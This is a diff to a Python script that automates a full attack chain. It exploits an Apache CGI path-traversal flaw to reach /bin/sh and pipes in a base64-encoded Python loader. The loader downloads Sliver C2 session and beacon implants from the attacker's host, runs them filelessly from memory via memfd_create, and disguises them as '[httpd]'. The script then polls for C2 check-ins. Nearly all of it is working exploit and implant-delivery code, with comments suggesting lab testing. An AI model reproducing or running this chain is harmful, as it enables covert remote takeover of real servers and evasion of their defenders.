@@ -28,7 +28,6 @@ def ensure_sliver_daemon():
             stderr=subprocess.DEVNULL,
             start_new_session=True
         )
-        # Give the daemon a few seconds to unpack assets and bind to 31337
         print("[*] Waiting 12 seconds for Sliver daemon to initialize...")
         time.sleep(12)
     else:
@@ -52,12 +51,35 @@ def ensure_sliver_listener():
         print(f"[-] Error checking/starting Sliver listener: {e}")
 
 def ensure_beacon_compiled(kali_ip):
-    """Verify that the target Sliver beacon is compiled and exists at /tmp/beacon.
-    If not found, triggers a background garble compilation via sliver-client.
+    """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
+    If missing, triggers a background garble compilation via sliver-client.
     """
-    if not os.path.exists("/tmp/beacon"):
-        print(f"[*] Sliver beacon not found at /tmp/beacon. Compiling beacon targeting {kali_ip}:8080...")
-        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/beacon\nexit\n"
+    # 1. Ensure real-time Session implant is compiled
+    if not os.path.exists("/tmp/session_implant"):
+        print(f"[*] C2 Session implant not found. Compiling targeting {kali_ip}:8080...")
+        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/session_implant\nexit\n"
+        rc_path = "/tmp/compile_session.rc"
+        with open(rc_path, "w") as f:
+            f.write(rc_content)
+        
+        cmd = ["sliver-client", "--rc", rc_path]
+        try:
+            res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+            if "saved to /tmp/session_implant" in res.stdout or os.path.exists("/tmp/session_implant"):
+                print("[+] C2 Session implant successfully compiled.")
+            else:
+                print(f"[-] Error compiling Session: {res.stdout}")
+                sys.exit(1)
+        except subprocess.TimeoutExpired:
+            print("[-] Timeout: Session compilation took longer than 90 seconds.")
+            sys.exit(1)
+    else:
+        print("[+] C2 Session implant exists at /tmp/session_implant.")
+
+    # 2. Ensure passive Beacon implant is compiled (check-in interval set to 5 seconds for testing)
+    if not os.path.exists("/tmp/beacon_implant"):
+        print(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
+        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
         rc_path = "/tmp/compile_beacon.rc"
         with open(rc_path, "w") as f:
             f.write(rc_content)
@@ -65,16 +87,16 @@ def ensure_beacon_compiled(kali_ip):
         cmd = ["sliver-client", "--rc", rc_path]
         try:
             res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
-            if "saved to /tmp/beacon" in res.stdout or os.path.exists("/tmp/beacon"):
-                print("[+] Sliver beacon successfully compiled and saved to /tmp/beacon.")
+            if "saved to /tmp/beacon_implant" in res.stdout or os.path.exists("/tmp/beacon_implant"):
+                print("[+] C2 Beacon implant successfully compiled.")
             else:
-                print(f"[-] Error compiling beacon: {res.stdout}")
+                print(f"[-] Error compiling Beacon: {res.stdout}")
                 sys.exit(1)
         except subprocess.TimeoutExpired:
-            print("[-] Timeout: Sliver compilation took longer than 90 seconds.")
+            print("[-] Timeout: Beacon compilation took longer than 90 seconds.")
             sys.exit(1)
     else:
-        print("[+] Sliver beacon exists at /tmp/beacon.")
+        print("[+] C2 Beacon implant exists at /tmp/beacon_implant.")
 
 def ensure_file_server():
     """Verify that the Python HTTP web server on port 8000 is active.
@@ -97,28 +119,39 @@ def ensure_file_server():
 def build_payload(kali_ip, file_port):
     """Generate the Base64-encoded Python loader payload.
     This loader runs entirely in-memory using the memfd_create system call.
-    It forks into the background, executes the C2 beacon via its memory file
-    descriptor (/proc/self/fd/N) masquerading as '[httpd]', and terminates the
-    CGI parent process immediately to keep the HTTP request fast and non-blocking.
+    It downloads and runs BOTH the session implant and the beacon implant in parallel,
+    allowing comparative analysis. Both processes masquerade as '[httpd]' under www-data.
     """
     loader_code = f"""import urllib.request, ctypes, os, sys
 try:
-    url = "http://{kali_ip}:{file_port}/beacon"
-    req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
-    with urllib.request.urlopen(req) as r:
-        data = r.read()
     libc = ctypes.CDLL(None)
-    # sys_memfd_create(const char *name, unsigned int flags)
-    # syscall 319 on x86_64, MFD_CLOEXEC = 1
-    fd = libc.syscall(319, b'httpd_cache', 1)
-    if fd >= 0:
-        os.write(fd, data)
+    
+    # 1. Download and execute C2 Session (real-time)
+    url_sess = "http://{kali_ip}:{file_port}/session_implant"
+    with urllib.request.urlopen(url_sess) as r:
+        data_sess = r.read()
+    fd_sess = libc.syscall(319, b'httpd_cache', 1)
+    if fd_sess >= 0:
+        os.write(fd_sess, data_sess)
         if os.fork() == 0:
-            os.execve(f"/proc/self/fd/{{fd}}", ["[httpd]"], os.environ)
-        else:
-            print("Content-Type: text/plain\\n")
-            print("OK")
+            os.execve(f"/proc/self/fd/{{fd_sess}}", ["[httpd]"], os.environ)
             sys.exit(0)
+
+    # 2. Download and execute C2 Beacon (5s interval)
+    url_beac = "http://{kali_ip}:{file_port}/beacon_implant"
+    with urllib.request.urlopen(url_beac) as r:
+        data_beac = r.read()
+    fd_beac = libc.syscall(319, b'httpd_cache', 1)
+    if fd_beac >= 0:
+        os.write(fd_beac, data_beac)
+        if os.fork() == 0:
+            os.execve(f"/proc/self/fd/{{fd_beac}}", ["[httpd]"], os.environ)
+            sys.exit(0)
+
+    # CGI parent exits immediately to prevent connection hangs
+    print("Content-Type: text/plain\\n")
+    print("OK")
+    sys.exit(0)
 except Exception as e:
     sys.exit(1)
 """
@@ -133,7 +166,6 @@ def fire_exploit(target_url, kali_ip, file_port=8000):
     port = parsed.port or 80
 
     b64_payload = build_payload(kali_ip, file_port)
-    # The CGI execution payload
     payload = f"echo {b64_payload} | base64 -d | python3"
     path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
 
@@ -167,13 +199,13 @@ def fire_exploit(target_url, kali_ip, file_port=8000):
             s.close()
 
 def check_sliver_session():
-    """Run sliver-client to see if any sessions checked in."""
-    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
+    """Run sliver-client to query both sessions and beacons."""
+    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'beacons' >> /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
     try:
         res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
         return res.stdout
     except Exception as e:
-        print(f"[-] Error checking Sliver sessions: {e}")
+        print(f"[-] Error checking Sliver sessions/beacons: {e}")
         return ""
 
 def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
@@ -191,23 +223,23 @@ def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
     # 1. Fire the exploit
     fire_exploit(target_url, kali_ip, file_port)
     
-    # 2. Wait and poll for the session in Sliver
-    print("[*] Waiting for Sliver C2 session check-in (polling every 5s)...")
-    for attempt in range(1, 13):
+    # 2. Wait and poll for the sessions/beacons in Sliver
+    print("[*] Waiting for Sliver C2 check-ins (polling every 5s)...")
+    for attempt in range(1, 15):
         time.sleep(5)
         output = check_sliver_session()
-        # Look for any active sessions in Sliver's output
+        # Look for any active connections/beacons in Sliver's output
         if "linux" in output.lower() or "active" in output.lower():
             lines = output.splitlines()
-            session_lines = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
-            if session_lines:
-                print(f"[+] Success! Active C2 session detected in Sliver:")
-                for sl in session_lines:
-                    print(f"    {sl}")
+            matches = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
+            if matches:
+                print(f"[+] Success! Active C2 connection(s) detected in Sliver:")
+                for m in matches:
+                    print(f"    {m}")
                 return True
-        print(f"[*] Attempt {attempt}/12: No active C2 session yet...")
+        print(f"[*] Attempt {attempt}/14: No C2 check-ins yet...")
         
-    print("[-] Timeout: Sliver session failed to establish.")
+    print("[-] Timeout: Sliver connections failed to establish.")
     return False
 
 if __name__ == "__main__":
